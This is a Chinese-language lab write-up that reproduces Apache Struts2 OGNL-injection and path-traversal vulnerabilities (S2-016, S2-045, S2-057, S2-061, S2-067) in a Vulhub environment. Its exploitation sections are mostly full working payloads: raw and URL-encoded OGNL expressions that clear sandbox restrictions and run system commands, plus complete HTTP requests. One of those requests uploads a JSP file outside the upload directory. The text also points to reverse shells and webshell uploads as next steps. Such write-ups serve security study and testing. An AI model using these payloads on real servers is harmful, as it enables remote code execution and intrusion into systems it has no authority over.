---
title: Apache Struts2
published: 2026-10-06T09:00:00+08:00
description: 全面解析 Struts2 框架的 OGNL 表达式注入漏洞，从 S2-001 到 S2-067 完整复现，涵盖 S2-045（CVE-2017-5638）、S2-057（CVE-2018-11776）、S2-061（CVE-2020-17530）、S2-067（CVE-2024-53677）等核心漏洞的原理分析、利用手法及实战修复方案。
image: images/Pasted image 20260910105635.png
tags:
  - Vulhub
  - CVE
category: Vulhub靶场
draft: false
pinned: false
lang: zh-CN
author: Ynm
comment: true
---

| 项目          | 详情                                                                                                                    |
| ----------- | --------------------------------------------------------------------------------------------------------------------- |
| **攻击机**     | Kali Linux（IP：192.168.197.10）                                                                                         |
| **靶机**      | Ubuntu Server 24.04（IP：192.168.197.88）                                                                                |
| **CVSS 评分** | S2-045: 9.8（严重） / S2-057: 9.8（严重） / S2-061: 9.8（严重）                                                                   |
| **典型漏洞编号**  | S2-045（CVE-2017-5638）/ S2-057（CVE-2018-11776）/ S2-061（CVE-2020-17530）/ S2-066（CVE-2023-50164）/ S2-067（CVE-2024-53677） |
| **影响组件**    | Apache Struts2 2.0.0 ~ 6.3.0（各漏洞影响版本不同）                                                                               |
| **漏洞类型**    | OGNL 表达式注入 → 远程代码执行（RCE）/ 路径遍历                                                                                        |
| **利用条件**    | 使用漏洞版 Struts2 + 用户可控的 OGNL 表达式输入点                                                                                     |
| **核心原理**    | `%{...}` 或 `${...}` 表达式未安全过滤，导致 OGNL 解析器执行恶意代码                                                                        |
## 一、漏洞原理
### 3.1 漏洞原理

Apache Struts2 漏洞的本质，源于其核心的 **OGNL**（Object-Graph Navigation Language，对象图导航语言）表达式注入。

OGNL 是一种功能强大的表达式语言，其设计的初衷，是为了在无法直接编写 Java 代码的地方（如配置文件、JSP页面）执行 Java 代码或访问对象数据。Struts2 框架使用 OGNL 作为默认的表达式语言来处理数据传递和视图渲染。

漏洞的根源在于，Struts2 在某些场景下会对用户输入（例如 URL 参数、请求头、标签属性）进行 OGNL 表达式解析。当 Struts2 在处理过程中，使用 %{...} 或 ${...} 包裹用户输入并交由 OGNL 引擎解析时，若未进行严格的安全过滤，攻击者就可以构造恶意的 OGNL 表达式，通过用户可控的输入点注入到服务器端，由 OGNL 引擎执行。

由于 OGNL 能够直接调用 Java 对象的方法和属性，一个成功的注入通常会导致远程代码执行（RCE），攻击者可以在目标服务器上执行任意系统命令。不过，为了限制 OGNL 的权限，Struts2 引入了 OGNL 沙盒（Sandbox） 机制。沙盒通过黑名单等方式，限制 OGNL 表达式能够访问和调用的 Java 类及方法。因此，一个完整的 Struts2 漏洞利用，通常需要包含沙盒绕过（Sandbox Bypass） 技术，这是许多 Payload 看起来非常复杂的原因。
### 3.2 题目列表

| 漏洞编号       | Vulhub 目录        | 说明                                                                                                |
| :--------- | :--------------- | :------------------------------------------------------------------------------------------------ |
| **S2-001** | `struts2/s2-001` | **CVE-2007-4556**。当表单验证失败时，后端会对用户提交的参数执行 OGNL 表达式解析。                                              |
| **S2-005** | `struts2/s2-005` | **CVE-2010-1870**。S2-003 漏洞的绕过方式，通过 `redirect:` 前缀注入 OGNL 表达式。                                    |
| **S2-007** | `struts2/s2-007` | 当类型验证转换出错时，服务器会将用户提交的表单值拼接并执行 OGNL 表达式解析，造成注入。                                                    |
| **S2-008** | `struts2/s2-008` | 漏洞点位于 `devmode` 模式下的调试接口，攻击者可通过特定参数执行 OGNL 表达式。                                                   |
| **S2-009** | `struts2/s2-009` | 参数值作为 OGNL 表达式被执行，导致了远程代码执行。                                                                      |
| **S2-012** | `struts2/s2-012` | **CVE-2013-1965**。当使用重定向结果类型且参数用户可控时，可导致 OGNL 表达式二次解析并执行。                                         |
| **S2-013** | `struts2/s2-013` | **CVE-2013-1966**。`s:a` 和 `s:url` 标签的 `includeParams` 属性值可被攻击者利用，导致 OGNL 表达式执行。                   |
| **S2-015** | `struts2/s2-015` | **CVE-2013-2135 / CVE-2013-2134**。通配符映射的 Action 名称作为 OGNL 表达式被执行。                                 |
| **S2-016** | `struts2/s2-016` | 在 `redirect` 和 `redirectAction` 结果类型中，参数名可被当作 OGNL 表达式解析。                                         |
| **S2-032** | `struts2/s2-032` | **CVE-2016-3081**。可通过 `method:` 前缀调用 `DynamicMethodInvocation` 执行 OGNL 表达式。                       |
| **S2-045** | `struts2/s2-045` | **CVE-2017-5638**。**经典漏洞**。通过构造恶意的 `Content-Type` 请求头注入 OGNL 表达式。                                 |
| **S2-046** | `struts2/s2-046` | **CVE-2017-5638** 的另一种利用方式，通过畸形的 `Content-Disposition` 请求头触发。                                     |
| **S2-048** | `struts2/s2-048` | **CVE-2017-9791**。在 `struts2-struts1-plugin` 插件中，`ActionMessage` 接收的用户输入可被 OGNL 解析。               |
| **S2-052** | `struts2/s2-052` | **CVE-2017-9805**。REST 插件的 XStream 反序列化漏洞，可导致远程代码执行。                                              |
| **S2-053** | `struts2/s2-053` | **CVE-2017-12611**。Freemarker 标签中 `id` 属性值可被 OGNL 表达式解析。                                          |
| **S2-057** | `struts2/s2-057` | **CVE-2018-11776**。当 `alwaysSelectFullNamespace` 为 `true` 时，可通过 URL 路径中的 `namespace` 注入 OGNL 表达式。 |
| **S2-059** | `struts2/s2-059` | **CVE-2019-0230**。标签属性值使用了 `%{...}` 且用户可控时，可造成 OGNL 表达式执行。                                        |
| **S2-061** | `struts2/s2-061` | **CVE-2020-17530**。S2-059 的沙盒绕过，利用相同的触发点执行恶意 OGNL 表达式。                                            |
| **S2-066** | `struts2/s2-066` | **CVE-2023-50164**。文件上传逻辑缺陷导致的路径遍历漏洞。                                                             |
| **S2-067** | `struts2/s2-067` | **CVE-2024-53677**。最新的文件上传路径遍历漏洞。                                                                 |

**建议的解题步骤：**

1. 先打 S2-016：用最简单的方式理解 OGNL 注入流程，不要管沙盒。
2. 再打 S2-045：掌握 Content-Type 注入的经典姿势。
3. 然后 S2-057：理解 namespace 注入的不同思路。
4. 接着 S2-061：看沙盒是如何被绕过的。
5. 最后 S2-067：换个口味，体验文件上传漏洞。
## 二、漏洞复现

### 方式一：S2-016（URL 参数注入）

S2-016 的 Payload 相对简洁，适合刚开始理解 OGNL 注入原理。

**① 原始 Payload（未编码）**

```text wrap
/index.action?redirect:${#context["xwork.MethodAccessor.denyMethodExecution"]=false,#f=#_memberAccess.getClass().getDeclaredField("allowStaticMethodAccess"),#f.setAccessible(true),#f.set(#_memberAccess,true),#a=@java.lang.Runtime@getRuntime().exec("id"),#b=new java.io.InputStreamReader(#a.getInputStream()),#c=new java.io.BufferedReader(#b),#d=#c.readLine(),#matt=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#matt.getWriter().println(#d),#matt.getWriter().flush(),#matt.getWriter().close()}
```

对于上面的payload解释如下：

整体结构为：

```text wrap
/index.action?redirect:${ ... 这里是一大串 OGNL 表达式 ... }
```

| 部分              | 含义                                                      |
| --------------- | ------------------------------------------------------- |
| `/index.action` | Struts2 的 Action 请求路径                                   |
| `?redirect:`    | **漏洞触发点**。Struts2 的 redirect 结果类型会把冒号后面的内容当作 OGNL 表达式解析 |
| `${...}`        | OGNL 表达式的标准语法，${} 内的内容会被 OGNL 引擎执行                      |

OGNL 表达式逐句拆解：

① 关闭方法执行保护
```text wrap
#context["xwork.MethodAccessor.denyMethodExecution"]=false

Struts2默认禁止在OGNL中调用任意方法。这行把它关掉，为后续调用Runtime.exec()铺路。
```

② 获取 allowStaticMethodAccess 字段
```text wrap
#f=#_memberAccess.getClass().getDeclaredField("allowStaticMethodAccess")

#_memberAccess是OGNL的成员访问控制器。这行用反射拿到它里面的allowStaticMethodAccess字段（默认是false，禁止调用静态方法）。
```

③ 绕过私有字段限制并开启静态方法
```text wrap
setAccessible(true)：让私有字段可以被修改
set(#_memberAccess,true)：把allowStaticMethodAccess改成true，允许调用静态方法（比如 Runtime.getRuntime()）

#f.setAccessible(true)
#f.set(#_memberAccess,true)
```

④ 执行系统命令
```text wrap
@java.lang.Runtime@getRuntime()：OGNL调用静态方法的标准语法
.exec("id")：执行系统命令id，结果保存在#a中

#a=@java.lang.Runtime@getRuntime().exec("id")
```

⑤ 读取命令输出
```text wrap
把命令的输出流包装成BufferedReader，然后读取第一行结果，存入#d。

#b=new java.io.InputStreamReader(#a.getInputStream())
#c=new java.io.BufferedReader(#b)
#d=#c.readLine()
```

⑥ 获取 HTTP 响应对象并回显
```text wrap
从OGNL上下文中取出HttpServletResponse对象
把命令执行结果#d写入HTTP响应
刷新并关闭输出流

#matt=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse")
#matt.getWriter().println(#d)
#matt.getWriter().flush()
#matt.getWriter().close()
```

 一句话总结，这段 Payload 的核心逻辑是：关闭沙盒限制 → 开启静态方法调用 → 执行 id 命令 → 把结果回显到浏览器。

因此我们可以把 exec("id") 里的 id 换成任意命令（如 whoami、ls、cat /etc/passwd），甚至换成反弹 Shell 命令，实现更进一步的利用。

**② URL 编码后的 Payload**

```text wrap
/index.action?redirect:%24%7B%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2C%23f.setAccessible(true)%2C%23f.set(%23_memberAccess%2Ctrue)%2C%23a%3D@java.lang.Runtime@getRuntime().exec(%22id%22)%2C%23b%3Dnew+java.io.InputStreamReader(%23a.getInputStream())%2C%23c%3Dnew+java.io.BufferedReader(%23b)%2C%23d%3D%23c.readLine()%2C%23matt%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22)%2C%23matt.getWriter().println(%23d)%2C%23matt.getWriter().flush()%2C%23matt.getWriter().close()%7D
```


为什么需要 URL 编码？

原始Payload里有大量特殊字符，比如 `#`、`{`、`}`、`$`、`[`、`]`、`"`。

- **`#`**：在 URL 中会被浏览器当作锚点（fragment），`#` 后面的内容根本不会发送给服务器。
- **`{}`、`$`、`"`** 等：在 URL 传输过程中也可能被截断或转义。

所以实际发送时，必须对整个 Payload 做 URL 编码：

| 字符 | 编码 |
|------|------|
| `#` | `%23` |
| `{` | `%7B` |
| `}` | `%7D` |
| `$` | `%24` |
| `[` | `%5B` |
| `]` | `%5D` |
| `"` | `%22` |
| 空格 | `%20` 或 `+` |

![](images/Pasted%20image%2020260910105538.png)
### 方式二：S2-045（Content-Type 注入）

S2-045 的漏洞点在于 Content-Type 请求头。Struts2 在处理 multipart 请求时，会对 Content-Type 进行 OGNL 解析，且未做充分过滤。

**① 验证漏洞是否存在**

抓包，将正常请求的 Content-Type 替换为以下 Payload（执行数学计算验证）：

```text wrap
Content-Type: %{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo $((233*233))').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/sh','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
```

如果返回 54289（233×233 的结果），说明漏洞存在。
![](images/Pasted%20image%2020261006105917.png)
**② 执行任意命令**

将 Payload 中的 `#cmd='echo $((233*233))'` 替换为 `#cmd='id'` 即可执行系统命令并回显。
![](images/Pasted%20image%2020261006110451.png)

### 方式三：S2-057（Namespace 注入）

S2-057 (CVE-2018-11776) 的触发点在于 URL 路径中的 namespace（命名空间） 。当 Struts2 的配置满足特定条件时，用户可控的 namespace 值会被当作 OGNL 表达式解析执行。

**漏洞触发条件：** 

S2-057 的利用窗口非常特殊，需要同时满足以下两个配置条件。
1. alwaysSelectFullNamespace 为 true：框架会优先从 URI 中提取完整的 namespace，而不是仅依赖 action 元素上声明的值。
2. Action 未声明 namespace，或使用了通配符（如 \*）：只有当 namespace 未设置或为通配符时，框架才会从 URI 中动态解析，给攻击者留下注入入口。

**影响版本**：Struts 2.3.34 及以下、Struts 2.5.16 及以下。

**① 验证漏洞是否存在**

启动 Vulhub 环境后，在 URL 路径中注入一个简单的 OGNL 表达式进行验证：

```text wrap
http://192.168.197.88:8080/$%7B233*233%7D/actionChain1.action
```

- `$%7B233*233%7D` 是 `${233*233}` 的 URL 编码形式。
- 如果漏洞存在，计算结果 `54289` 会出现在响应头的 `Location` 字段或 URL 中。

![](images/Pasted%20image%2020261006160609.png)
**② 命令执行（回显）**

将 ${233\*233} 替换为完整的命令执行 OGNL 表达式（需进行 URL 编码）：

```text wrap
${(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request['struts.valueStack'].context).(#cr=#ct['com.opensymphony.xwork2.ActionContext.container']).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#a=@java.lang.Runtime@getRuntime().exec('id')).(@org.apache.commons.io.IOUtils@toString(#a.getInputStream()))}
```

URL 编码后的完整 Payload：

```text wrap
http://192.168.197.88:8080/struts2-showcase/$%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23a%3D@java.lang.Runtime@getRuntime%28%29.exec%28%27id%27%29%29.%28@org.apache.commons.io.IOUtils@toString%28%23a.getInputStream%28%29%29%29%7D/actionChain1.action
```

命令执行结果会回显在响应中。
![](images/Pasted%20image%2020261006160718.png)
### 方式四：S2-061（标签属性注入）

S2-061 (CVE-2020-17530) 是 S2-059 的沙盒绕过。触发点在于 Struts2 标签的属性值（如 id）被使用 %{...} 包裹且用户可控时，OGNL 表达式会被二次解析执行。

**命令回显 Payload ：**

```http wrap
POST /index.action HTTP/1.1
Host: 192.168.197.88:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF
Content-Length: 827

------WebKitFormBoundaryl7d1B1aGsV2wcZwF
Content-Disposition: form-data; name="id"

%{(#instancemanager=#application["org.apache.tomcat.InstanceManager"]).(#stack=#attr["com.opensymphony.xwork2.util.ValueStack.ValueStack"]).(#bean=#instancemanager.newInstance("org.apache.commons.collections.BeanMap")).(#bean.setBean(#stack)).(#context=#bean.get("context")).(#bean.setBean(#context)).(#macc=#bean.get("memberAccess")).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance("java.util.HashSet")).(#bean.put("excludedClasses",#emptyset)).(#bean.put("excludedPackageNames",#emptyset)).(#arglist=#instancemanager.newInstance("java.util.ArrayList")).(#arglist.add("id")).(#execute=#instancemanager.newInstance("freemarker.template.utility.Execute")).(#execute.exec(#arglist))}
------WebKitFormBoundaryl7d1B1aGsV2wcZwF--
```
![](images/Pasted%20image%2020261006162443.png)
### 方式五：S2-067（文件上传路径穿越）

在 Struts2 中，所有参数在传递时，参数的键名都会进行 OGNL 表达式的计算。这个特性历史上曾导致多次通过 OGNL 表达式注入实现远程命令执行的漏洞。虽然 Struts2 已经实现了严格的参数键名验证来防止 RCE 漏洞，但表达式计算仍然会发生。S2-067 就是利用这个表达式计算机制，再次覆盖上传文件时的文件名，最终导致目录穿越问题。


**漏洞复现**：

环境启动后，访问 `http://192.168.197.88:8080` 可以看到一个简单的文件上传页面。

在复现 S2-067 之前，建议先阅读 S2-066 的漏洞原理。在此环境中，已无法使用与 S2-066 相同的 Payload，因为大小写敏感性问题已被修复。我们需要将 OGNL 表达式 `top.fileFileName` 作为文件名参数键名的一部分，使文件再次被上传到受限上传目录之外。

构造以下 POST 请求：


```http wrap

POST /index.action HTTP/1.1
Host: 192.168.197.88:8080
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryl6ZFZPznNSPZOFJF
Content-Length: 335

------WebKitFormBoundaryl6ZFZPznNSPZOFJF
Content-Disposition: form-data; name="file"; filename="shell.jsp"
Content-Type: text/plain

<%
  out.println("hello world");
%>
------WebKitFormBoundaryl6ZFZPznNSPZOFJF
Content-Disposition: form-data; name="top.fileFileName"

../shell.jsp
------WebKitFormBoundaryl6ZFZPznNSPZOFJF--
```

**关键要素说明**：

- 与 S2-066 利用大小写敏感性不同，这里使用了参数键名中的 OGNL 表达式计算。
- 参数键名 `top.fileFileName` 会被作为 OGNL 表达式进行计算，该表达式指向上传文件的文件名属性。
- 通过将值设置为 `../shell.jsp`，实现了路径穿越，覆盖了原本的上传目录限制。
- 最终 JSP 文件被上传到受限目录之外，并可通过 `http://192.168.197.88:8080/shell.jsp` 访问执行。


![](images/Pasted%20image%2020261006170505.png)

![](images/Pasted%20image%2020261006170550.png)
**修复建议**：升级到 Struts 6.4.0 或更高版本，或参考官方安全公告及时修补。

## 📋 Struts2 漏洞对比一览

| 漏洞编号       | 注入点                | 触发方式           | 核心特点                                    |
| :--------- | :----------------- | :------------- | :-------------------------------------- |
| **S2-016** | URL 参数             | `redirect:` 前缀 | 最基础的 OGNL 注入，Payload 结构清晰               |
| **S2-045** | `Content-Type` 请求头 | 文件上传请求         | 无需登录，影响范围广，面试高频                         |
| **S2-057** | URL 路径 `namespace` | 特定配置条件下的路径遍历   | 原理独特，需 `alwaysSelectFullNamespace=true` |
| **S2-061** | 标签属性               | `%{...}` 二次解析  | S2-059 的沙盒绕过，展示沙盒演化                     |
| **S2-067** | 文件上传               | 路径遍历           | 与 OGNL 无关，属于文件上传逻辑漏洞                    |

**注意：以上漏洞都可以进一步使用反弹shell（S2-067则可以上传一句话木马），来获取系统的shell权限。**



